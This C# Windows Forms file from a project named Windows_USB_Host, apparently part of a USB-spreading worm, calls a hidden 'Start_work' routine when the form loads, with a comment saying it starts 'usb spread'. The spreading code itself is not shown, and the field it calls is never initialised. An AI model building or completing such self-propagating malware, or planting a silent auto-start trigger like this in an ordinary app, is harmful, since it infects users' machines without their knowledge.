using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Windows_USB_Host
{
    public partial class Form1 : Form
    {
           private static usb mnx;
         
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            mnx.Start_work();// for start usb spread

        }
    }
}
